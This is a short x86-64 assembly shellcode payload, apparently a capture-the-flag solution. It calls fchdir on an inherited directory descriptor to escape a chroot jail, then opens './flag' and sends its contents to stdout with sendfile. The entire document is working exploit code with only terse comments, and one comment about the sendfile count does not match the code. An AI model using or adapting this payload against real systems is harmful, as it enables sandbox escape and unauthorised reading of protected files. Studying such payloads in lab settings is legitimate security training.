.global _start
_start:
.intel_syntax noprefix
        # fchdir('/')
        xor rax, rax
        mov al, 81
        mov rdi, 3
        syscall
        # sendfile(1, open('./flag'), 0, 0)
        mov al, 2
        lea rdi, [rip+flag]
        xor rsi, rsi
        xor rdx, rdx
        syscall
        mov esi, eax
        mov al, 40
        xor edi, edi
        inc edi
        mov r10w, 0x3e8
        syscall
flag:
        .string "./flag"
